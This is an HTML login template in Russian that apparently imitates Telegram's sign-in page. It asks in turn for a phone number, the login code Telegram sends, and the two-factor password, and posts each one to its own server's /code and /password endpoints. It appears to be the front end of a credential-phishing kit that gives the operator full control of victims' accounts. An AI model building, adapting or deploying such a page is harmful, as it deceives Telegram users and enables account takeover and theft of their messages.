<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход в Telegram</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h1>Войти в Telegram</h1>

        <div class="subtitle">Проверьте код страны и введите номер телефона</div>

        <div class="language-select">
            <label for="language">Язык:</label>
            <select id="language" onchange="changeLanguage(this.value)">
                <option value="ru" selected>Русский</option>
                <option value="en">English</option>
                <option value="uk">Українська</option>
                <!-- можно добавить другие -->
            </select>
        </div>

        {% if error %}
            <p class="error">{{ error }}</p>
        {% elif success %}
            <p class="success">{{ success }}</p>
        {% endif %}

        {% if stage == "phone" %}
        <form method="POST" id="phone-form">
            <input type="tel" name="phone" placeholder="+7 ___ ___ __ __" pattern="^\+(\d{1,3})\d{6,14}$" required title="Введите номер с кодом страны, например +7XXXXXXXXXX">
            <label class="checkbox-label">
                <input type="checkbox" name="remember_me" id="remember_me"> Запомнить меня
            </label>
            <button type="submit">Далее</button>
        </form>

        {% elif stage == "code" %}
        <form method="POST" action="/code" id="code-form">
            <input type="hidden" name="phone" value="{{ phone }}">
            <input type="text" name="code" placeholder="Введите код из Telegram" required>
            <button type="submit">Подтвердить</button>
        </form>

        {% elif stage == "2fa" %}
        <form method="POST" action="/password" id="password-form">
            <input type="hidden" name="phone" value="{{ phone }}">
            <input type="password" name="password" placeholder="Введите пароль 2FA" required>
            <button type="submit">Войти</button>
        </form>
        {% endif %}
    </div>

<script>
    // Можно добавить логику переключения языка (для начала просто пример)
    function changeLanguage(lang) {
        alert('Выбран язык: ' + lang + '. Функционал переключения языков можно реализовать позже.');
    }
</script>

</body>
</html>
